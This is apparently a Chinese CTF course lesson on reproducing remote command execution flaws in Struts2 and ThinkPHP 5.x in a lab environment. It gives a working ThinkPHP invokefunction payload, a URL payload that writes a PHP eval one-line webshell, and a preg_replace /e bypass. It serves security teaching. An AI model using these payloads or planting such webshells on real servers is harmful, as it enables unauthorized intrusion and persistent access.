# CTF教程：P61：命令执行实战与漏洞复现

![](img/387fcb49d1b6b142c1b008b876d7aae2_1.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_3.png)

在本节课中，我们将学习命令执行漏洞的实战应用，通过复现几个经典的漏洞案例来加深理解。我们将涵盖Struts2、ImageMagick以及ThinkPHP等框架或组件的远程命令执行漏洞，并学习如何利用这些漏洞获取系统权限。

![](img/387fcb49d1b6b142c1b008b876d7aae2_5.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_7.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_9.png)

---

![](img/387fcb49d1b6b142c1b008b876d7aae2_11.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_13.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_15.png)

## 概述与实验回顾

![](img/387fcb49d1b6b142c1b008b876d7aae2_17.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_19.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_20.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_22.png)

上一节我们介绍了命令执行的基本原理和绕过技巧。本节中，我们将通过几个具体的实验来实战演练。这些实验都配有详细的指导书，大家对照操作应该没有问题。核心原理与我们之前讲解的代码类似。

![](img/387fcb49d1b6b142c1b008b876d7aae2_24.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_26.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_27.png)

以下是本节课将要涉及的几个实验：
1.  Struts2 远程命令执行漏洞复现
2.  ImageMagick 命令执行漏洞
3.  ThinkPHP 5.x 远程命令执行漏洞

![](img/387fcb49d1b6b142c1b008b876d7aae2_29.png)

---

![](img/387fcb49d1b6b142c1b008b876d7aae2_31.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_33.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_35.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_37.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_39.png)

## Struts2 远程命令执行漏洞复现 🐱💻

![](img/387fcb49d1b6b142c1b008b876d7aae2_41.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_43.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_45.png)

首先，我们来看Struts2框架的远程命令执行漏洞。这个实验需要我们先部署漏洞环境。

### 环境部署步骤

以下是部署Struts2漏洞环境的详细步骤：
1.  根据指导书提供的下载链接，获取漏洞环境所需的WAR包。
2.  启动Tomcat服务器（默认端口8080）。
3.  将下载的WAR包（通常包含Struts2框架的核心文件）放置到Tomcat的 `webapps` 目录下。
4.  访问 `http://靶机IP:8080/部署的路径` 即可看到测试页面。

**注意**：访问时需注意URL路径。若按指导书直接访问带 `/../` 的路径，在点击页面功能时可能会因路径错误而报错。正确的访问路径不应包含多余的目录跳转符号。

![](img/387fcb49d1b6b142c1b008b876d7aae2_47.png)

### 漏洞利用与POC分析

![](img/387fcb49d1b6b142c1b008b876d7aae2_49.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_51.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_53.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_54.png)

部署成功后，我们可以利用公开的POC（Proof of Concept）进行漏洞利用。POC通常是一段Java代码，用于执行系统命令。

![](img/387fcb49d1b6b142c1b008b876d7aae2_56.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_58.png)

核心的利用代码片段如下（以执行 `calc` 命令弹出计算器为例）：
```java
Runtime.getRuntime().exec("calc.exe");
```
在实际攻击中，我们可以将 `calc.exe` 替换为任意系统命令，例如 `ipconfig` 或写入Webshell的命令。

![](img/387fcb49d1b6b142c1b008b876d7aae2_60.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_62.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_64.png)

利用过程如下：
1.  使用Burp Suite等工具拦截向漏洞页面发送的请求。
2.  将POC代码构造到HTTP请求包中（通常放在特定参数里）。
3.  发送请求，如果漏洞存在且利用成功，目标服务器将会执行我们指定的命令。

![](img/387fcb49d1b6b142c1b008b876d7aae2_66.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_68.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_70.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_72.png)

---

## ThinkPHP 5.x 远程命令执行漏洞 🔐

接下来，我们分析ThinkPHP 5.x版本的远程命令执行漏洞。这个漏洞影响范围广，利用方式简单。

![](img/387fcb49d1b6b142c1b008b876d7aae2_74.png)

### 漏洞验证与命令执行

我们可以使用一个简单的POC来验证漏洞是否存在。例如，访问以下URL结构（具体参数需根据版本调整）：
```
http://靶机URL/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```
这个POC利用了框架的动态调用功能。其中：
*   `call_user_func_array` 是一个PHP函数，用于调用回调函数。
*   `vars[0]` 指定要调用的函数是 `system`。
*   `vars[1][]` 指定传递给 `system` 函数的参数是 `whoami`。

**本质上，这段POC构造了一个函数调用链：`call_user_func_array('system', ['whoami'])`，最终在服务器上执行了 `whoami` 命令。**

### 写入Webshell

![](img/387fcb49d1b6b142c1b008b876d7aae2_76.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_78.png)

获取命令执行权限后，下一步通常是写入Webshell以维持访问。我们可以利用 `file_put_contents` 函数。

以下是写入一句话木马Webshell的POC示例：
```
http://靶机URL/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php @eval($_POST['cmd']);?>
```
这个POC会尝试在网站根目录下创建一个名为 `shell.php` 的文件，内容为PHP一句话木马。

![](img/387fcb49d1b6b142c1b008b876d7aae2_80.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_82.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_83.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_84.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_85.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_87.png)

**代码执行与字符串处理的区别**：请注意，利用 `call_user_func_array` 执行 `system(‘whoami’)` 时，参数是作为**代码**被执行的。而利用 `file_put_contents` 写入文件时，参数 `<?php ... ?>` 是作为**字符串**被写入文件的。后者不需要以分号结尾，因为它只是字符串内容的一部分。

![](img/387fcb49d1b6b142c1b008b876d7aae2_89.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_91.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_93.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_95.png)

---

## 命令执行函数与绕过技巧的补充 🛡️

![](img/387fcb49d1b6b142c1b008b876d7aae2_97.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_99.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_101.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_103.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_104.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_106.png)

在上一节课中，我们介绍了 `preg_replace` 函数在 `/e` 模式下可能造成的代码执行漏洞。这里补充一个变种情况。

![](img/387fcb49d1b6b142c1b008b876d7aae2_108.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_110.png)

考虑以下代码：
```php
$data = $_GET[‘data’];
$data = strtoupper($data); // 将输入转换为大写
echo preg_replace(‘/.*/e’, ‘$data’, ‘test’);
```
这段代码先将我们的输入全部转为大写，然后再执行 `preg_replace`。如果我们直接传入 `phpinfo()`，它会被转换成 `PHPINFO()`，而PHP函数名是大小写不敏感的，所以仍能执行。但如果传入的是字符串拼接的代码，大写可能导致失效。

![](img/387fcb49d1b6b142c1b008b876d7aae2_112.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_114.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_116.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_118.png)

### 利用双引号字符串解析绕过

![](img/387fcb49d1b6b142c1b008b876d7aae2_120.png)

PHP中，双引号 `“”` 包裹的字符串会解析其中的变量，而单引号 `’’` 则不会。我们可以利用这个特性来绕过某些过滤。

![](img/387fcb49d1b6b142c1b008b876d7aae2_122.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_124.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_126.png)

例如，我们传入：
```
“{${phpinfo()}}”
```
当这个字符串被 `preg_replace` 的 `/e` 模式处理时，PHP引擎会先解析双引号内的变量 `{${phpinfo()}}`。这里的 `phpinfo()` 会被执行，其返回值（理论上应为NULL）作为变量名。虽然最终变量可能不存在，但 `phpinfo()` 函数**已经在解析阶段被执行了**，从而达到了代码执行的目的。

---

## 总结与课后任务 📚

![](img/387fcb49d1b6b142c1b008b876d7aae2_128.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_130.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_131.png)

本节课我们一起学习了三个经典命令执行漏洞的实战复现：
1.  **Struts2漏洞**：学习了环境部署、POC分析与利用，通过执行系统命令验证漏洞。
2.  **ThinkPHP漏洞**：深入分析了利用 `call_user_func_array` 进行远程命令执行和写入Webshell的原理与方法。
3.  **技巧补充**：了解了在 `preg_replace` 的 `/e` 模式被过滤时，如何利用PHP双引号字符串的特性绕过限制。

![](img/387fcb49d1b6b142c1b008b876d7aae2_133.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_135.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_137.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_139.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_141.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_143.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_144.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_145.png)

**课后任务**：
*   请务必亲手完成实验指导书上的操作，并记录详细步骤和遇到的问题。
*   尝试理解每个POC背后的代码逻辑，而不仅仅是复制粘贴。
*   思考在实战中，如何探测目标网站是否存在这些漏洞（例如使用指纹识别工具识别ThinkPHP框架）。
*   熟练掌握NC（Netcat）工具的正反向连接，这对于获取反向Shell至关重要。

![](img/387fcb49d1b6b142c1b008b876d7aae2_147.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_148.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_150.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_152.png)

![](img/387fcb49d1b6b142c1b008b876d7aae2_154.png)

命令执行是Web安全中危害极大的漏洞，理解其原理并熟练运用各种利用与绕过技巧，是成为一名合格安全研究员的重要基础。